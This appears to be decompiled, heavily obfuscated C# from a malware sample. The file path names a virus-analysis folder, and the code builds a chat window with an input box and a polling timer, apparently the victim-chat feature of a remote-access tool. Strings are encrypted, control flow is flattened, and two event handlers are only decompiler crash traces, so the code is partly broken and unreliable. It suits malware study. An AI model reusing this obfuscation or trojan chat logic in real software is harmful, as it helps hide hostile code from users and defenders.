using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

[DesignerGenerated]
public class ______________________________________________________________________ : Form
{
	private IContainer _;

	[AccessedThroughProperty("chatBox")]
	private RichTextBox __;

	[AccessedThroughProperty("inputBox")]
	private TextBox ___;

	[AccessedThroughProperty("getChat")]
	private Timer ____;

	public string _____;

	internal virtual RichTextBox _
	{
		get
		{
			return this.__;
		}
		set
		{
			this.__ = value;
		}
	}

	internal virtual TextBox __
	{
		get
		{
			return this.___;
		}
		set
		{
			______________________________________________________________________ ____________________________________ = this;
			KeyEventHandler keyEventHandler = new KeyEventHandler(____________________________________.__________);
			if (this.___ != null)
			{
				this.___.KeyDown -= keyEventHandler;
			}
			this.___ = value;
			if (this.___ != null)
			{
				this.___.KeyDown += keyEventHandler;
			}
		}
	}

	internal virtual Timer ___
	{
		get
		{
			return this.____;
		}
		set
		{
			______________________________________________________________________ ____________________________________ = this;
			EventHandler eventHandler = new EventHandler(____________________________________.___________);
			if (this.____ != null)
			{
				this.____.Tick -= eventHandler;
			}
			this.____ = value;
			if (this.____ != null)
			{
				this.____.Tick += eventHandler;
			}
		}
	}

	public ______________________________________________________________________()
	{
		______________________________________________________________________ ____________________________________ = this;
		base.Load += new EventHandler(____________________________________.________);
		______________________________________________________________________ ____________________________________1 = this;
		base.FormClosing += new FormClosingEventHandler(____________________________________1._________);
		this._();
	}

	[DebuggerStepThrough]
	private void _()
	{
		unsafe
		{
			int num = 0;
			System.Drawing.Size size;
			Point point;
			int length = 0;
			this._ = new System.ComponentModel.Container();
			this._ = new RichTextBox();
			this.__ = new TextBox();
			object obj = Type.EmptyTypes.Length + 8;
			while (true)
			{
				switch (obj)
				{
					case 0:
					{
						RichTextBox richTextBox = this._;
						point = new Point(2, 2);
						richTextBox.Location = point;
						obj = Type.EmptyTypes.Length + 2;
						continue;
					}
					case 1:
					{
						RichTextBox richTextBox1 = this._;
						size = new System.Drawing.Size(433, 318);
						richTextBox1.Size = size;
						int num1 = length;
						length = -28555;
						if (num1 == -22855)
						{
							this._.TabIndex = 2;
							this._.Text = <Module>.__________((int)(sizeof(long) + 11597), 10018, checked((int)59));
							if (length == 16053)
							{
								goto case 7;
							}
							TextBox textBox = this.__;
							point = new Point(2, 326);
							textBox.Location = point;
							obj = sizeof(int) + 3;
							continue;
						}
						else
						{
							break;
						}
					}
					case 2:
					{
						this._.Name = <Module>.______<string>(-1226557881);
						this._.ReadOnly = true;
						length = Type.EmptyTypes.Length + -22855;
						num = checked((int)1);
						obj = num;
						continue;
					}
					case 3:
					{
						this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
						size = new System.Drawing.Size(441, 353);
						this.ClientSize = size;
						length = Type.EmptyTypes.Length + -13792;
						obj = Type.EmptyTypes.Length + 6;
						continue;
					}
					case 4:
					{
						this.__.TabIndex = 1;
						this.AutoScaleDimensions = new SizeF(6f, 13f);
						obj = sizeof(ushort) + 1;
						continue;
					}
					case 5:
					{
						this.Name = <Module>._____<string>(1493608640);
						this.StartPosition = FormStartPosition.CenterScreen;
						this.Text = <Module>.______<string>(-1893699119);
						this.ResumeLayout(false);
						this.PerformLayout();
						return;
					}
					case 6:
					{
						this.Controls.Add(this.__);
						this.Controls.Add(this._);
						if (length == -9358)
						{
							goto case 4;
						}
						else
						{
							break;
						}
					}
					case 7:
					{
						this.__.Name = <Module>._____<string>(218222871);
						TextBox textBox1 = this.__;
						size = new System.Drawing.Size(433, 20);
						textBox1.Size = size;
						if ((num * 1024 & -597377024) == (628 * num + num * 396 & -597377024))
						{
							obj = Type.EmptyTypes.Length + 4;
							continue;
						}
						else
						{
							obj = checked((int)-1883304853);
							continue;
						}
					}
					case 8:
					{
						this.___ = new Timer(this._);
						this.SuspendLayout();
						obj = Type.EmptyTypes.Length + 0;
						continue;
					}
					default:
					{
						goto case 8;
					}
				}
				this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedDialog;
				this.MaximizeBox = false;
				this.MinimizeBox = false;
				obj = (2018 + length * 1396965376 != -8211 ? Type.EmptyTypes.Length + 5 : Type.EmptyTypes.Length + 2133154395);
			}
			this.Name = <Module>._____<string>(1493608640);
			this.StartPosition = FormStartPosition.CenterScreen;
			this.Text = <Module>.______<string>(-1893699119);
			this.ResumeLayout(false);
			this.PerformLayout();
		}
	}

	private void ________(object sender, EventArgs e)
	{
		// 
		// Current member / type: System.Void ______________________________________________________________________::________(System.Object,System.EventArgs)
		// File path: C:\Users\george.bungarzescu\Desktop\virus\dot_peack_decompiled\VirusDecompiler\bin\Debug\HuuGhrjxjVBDecoded.hex-cleaned.dll
		// 
		// Product version: 2016.1.112.1
		// Exception in: System.Void ________(System.Object,System.EventArgs)
		// 
		// Object reference not set to an instance of an object.
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 112
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 26
		//    at ..BuildTree( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\FastDominatorTreeBuilder.cs:line 25
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DominatorTreeDependentStep.cs:line 18
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 68
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 59
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 128
		//    at ..( ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 51
		//    at ..(MethodBody ,  , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 88
		//    at ..(MethodBody , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 70
		//    at ..( , ILanguage , MethodBody , & ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 99
		//    at ..(MethodBody , ILanguage , & ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 62
		//    at ..(ILanguage , MethodDefinition ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\WriterContextServices\BaseWriterContextService.cs:line 116
		// 
		// mailto: JustDecompilePublicFeedback@telerik.com

	}

	private void _________(object sender, FormClosingEventArgs e)
	{
		// 
		// Current member / type: System.Void ______________________________________________________________________::_________(System.Object,System.Windows.Forms.FormClosingEventArgs)
		// File path: C:\Users\george.bungarzescu\Desktop\virus\dot_peack_decompiled\VirusDecompiler\bin\Debug\HuuGhrjxjVBDecoded.hex-cleaned.dll
		// 
		// Product version: 2016.1.112.1
		// Exception in: System.Void _________(System.Object,System.Windows.Forms.FormClosingEventArgs)
		// 
		// Object reference not set to an instance of an object.
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 112
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 26
		//    at ..BuildTree( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\FastDominatorTreeBuilder.cs:line 25
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DominatorTreeDependentStep.cs:line 18
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 68
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 59
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 128
		//    at ..( ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 51
		//    at ..(MethodBody ,  , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 88
		//    at ..(MethodBody , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 70
		//    at ..( , ILanguage , MethodBody , & ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 99
		//    at ..(MethodBody , ILanguage , & ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 62
		//    at ..(ILanguage , MethodDefinition ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\WriterContextServices\BaseWriterContextService.cs:line 116
		// 
		// mailto: JustDecompilePublicFeedback@telerik.com

	}

	private void __________(object sender, KeyEventArgs e)
	{
		int num = 0;
		int num1 = 0;
		int ____ = 0;
		object length;
		try
		{
		Label0:
			if (e.KeyCode == Keys.Return)
			{
				e.SuppressKeyPress = true;
				length = ((6285 + 1064 * num1 + num1 * 984 & 1359) != 13 ? sizeof(ulong) + 1303441560 : sizeof(float) + -3);
			Label5:
				while (true)
				{
					switch (length)
					{
						case 0:
						{
							goto Label1;
						}
						case 2:
						{
							break;
						}
						case 3:
						{
							__________________________________.____________ = -1645271601;
							this.__.Text = this.__.Text.Replace(<Module>.___<string>(-1617572493), string.Empty);
							num1 = (int)(sizeof(ushort) + 32343);
							length = Type.EmptyTypes.Length + 0;
							continue;
						}
						default:
						{
							goto Label2;
						}
					}
				}
				TextBox textBox = this.__;
				____ = ______________________._______;
				textBox.Text = <Module>.__________(((32768 * ____ | -105) == -105 ? (int)(sizeof(ulong) + 51624) : Type.EmptyTypes.Length + 1719516878), Type.EmptyTypes.Length + 51160, Type.EmptyTypes.Length + 109);
				this._.SelectionStart = this._.Text.Length;
				this._.ScrollToCaret();
			}
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
		return;
	Label1:
		num1 = 32345;
		int ______ = <Module>.__________;
		(16 & ((8069 + ______) * 16 ^ 5402 + 153552 * ______)) == 0;
		______________________________________________________________.___________(string.Concat(<Module>.______<string>(1053168784), this.__.Text, <Module>._______<string>(1974200954)));
		if (num1 == 22535)
		{
			goto Label0;
		}
		this._.Text = string.Concat(this._.Text, <Module>.____<string>(2062874770), this.__.Text, <Module>.___<string>(1108583536));
		if (118 * ____ + 1930 * ____ == -1697271203)
		{
			goto Label4;
		}
		length = sizeof(double) + -6;
		goto Label5;
	Label2:
		if (!this.__.Text.Contains(<Module>._____<string>(1052623516)))
		{
			goto Label1;
		}
		length = Type.EmptyTypes.Length + 3;
		goto Label5;
	Label4:
		(____ << 9) + 182816 != 16 * ((num << 7) + 3036);
		goto Label2;
	}

	private void ___________(object sender, EventArgs e)
	{
		int num;
		try
		{
			this.BringToFront();
			if (!______________________________________________________________._________________________)
			{
				Application.ExitThread();
			}
			if (Operators.CompareString(_________________________________________________________________._, <Module>.__________(Type.EmptyTypes.Length + 15388, Type.EmptyTypes.Length + 13845, (int)(sizeof(ulong) + 133)), false) != 0)
			{
				int num1 = (int)(sizeof(double) + 25595);
				int length = Type.EmptyTypes.Length + 0;
				while (true)
				{
					switch (length)
					{
						case 0:
						{
							while (Operators.CompareString(_________________________________________________________________._, <Module>.___<string>(1277940466), false) == 0)
							{
								if (num1 == 10456)
								{
									continue;
								}
								this.Close();
								Application.ExitThread();
								break;
							}
							RichTextBox richTextBox = this._;
							string[] text = new string[] { this._.Text, this._____, <Module>._____<string>(1155842849), _________________________________________________________________._, <Module>._______<string>(-278809455) };
							richTextBox.Text = string.Concat(text);
							length = checked((int)1);
							continue;
						}
						case 1:
						{
							break;
						}
						default:
						{
							goto case 0;
						}
					}
				}
				int length1 = Type.EmptyTypes.Length + 46429;
				int ______ = <Module>.__________;
				if ((6400 & ______ / 67108864) == 0)
				{
					num = 15;
				}
				else
				{
					num = (~-(______ * -1503395840) == 262144 * ______ ? Type.EmptyTypes.Length + -1850472152 : Type.EmptyTypes.Length + 369414464);
				}
				_________________________________________________________________._ = <Module>.__________(48255, length1, num);
				this._.SelectionStart = this._.Text.Length;
				this._.ScrollToCaret();
			}
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
	}

	protected override void System.Windows.Forms.Form.Dispose(bool disposing)
	{
		try
		{
			if (disposing && this._ != null)
			{
				this._.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}
}